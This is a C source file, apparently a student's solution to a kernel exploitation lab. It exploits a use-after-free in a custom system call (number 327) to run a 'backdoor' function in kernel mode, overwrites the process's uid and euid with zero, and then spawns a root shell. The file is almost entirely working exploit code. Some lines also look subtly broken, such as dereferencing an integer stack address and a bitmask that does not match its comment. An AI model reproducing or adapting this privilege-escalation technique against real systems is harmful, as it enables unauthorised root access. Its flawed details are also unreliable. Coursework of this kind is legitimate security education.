#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
// Backdoor function
// NOTE: This function is supposed to execute in kernel space
// Therefore, you should make NO system calls or the kernel will crash
void backdoor() {
    // First, locate thread info. Check kernel source code arch/x86/include/asm/thread_info.h`
    // Note that you cannot get it directly with the system call. 

    // Next, you need to find thread_info->task->cred
    //
    // 1.  Use GDB to inspect the kernel stack and find what is the relationship between thread_info and thread_info->task->cred.
    // 2.  Note that this function is executed in the kernel that you can read/write directly.

    // Finally, you will need to rewrite the cred struct (uid and euid) and give your process highest privilege
    unsigned long sp;
    asm("mov %%rsp,%0" : "=g" (sp));


//[:+:]--------------------------------MyCode---------------------------------------[:+:]       
//The central idea behind the exploit is to take advantage of dangling pointers. We allocate memory in a pointer, and then free it. Aand once it is freed, we can re-use the pointer to direct it to the backdoor function 

    //Given the stack pointer, we attain the stack top by clearing th least significant 14 bits    
    unsigned long stackTop= sp & ( -1 << 14+1);

    //With the offsets given to us by GDP we can easily get the address toe the cred Struct, the uid, and the euid
    //Dereference: direct read
    unsigned long * credAddy =(unsigned long*)(*stackTop + 1456);
    unsigned long uidAddy = (*credAddy + 4);
    unsigned long euidAddy = (*credAddy + 20);


    //we can directly overwrite the target fields
    *(unsigned long *)uidAddy = 0;
    *(unsigned long *)euidAddy = 0;
//[:+:]--------------------------------/My Code---------------------------------------[:+:]



    return;
}


int main() {
    // Initial getuid(), should return non zero
    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    // Run the exploit    
    // You will need to use provided system calls to execute the backdoor() function in kernel mode 




//[:+:]--------------------------------My Code---------------------------------------[:+:]//
     //First we create a new node
     syscall(327, 1, NULL);

     //then we free the node
     syscall(327, 2, NULL);

     //then we add another node, but this time using the backdoor function address as its data 
     //this new node should take the place of the previous node in memory
     syscall(327, 3, backdoor);

     // Lastly, we use the syscall that is suppposed to invoke the print function of the first node, but instead, it calls our backdoor function
     syscall(327, 4, NULL);
//[:+:]--------------------------------My Code---------------------------------------[:+:]





    fprintf(stderr, "getuid() = %d\n", getuid());
    fprintf(stderr,"geteuid() = %d\n",geteuid());
    if (getuid() == 0&&geteuid()==0) {
        fprintf(stderr, "Trying to get a root shell.\n");
        char * sharg[] = {"/bin/sh", NULL};
        execv("/bin/sh", sharg); // You should see '#' at this point
    }

    return 0;
}

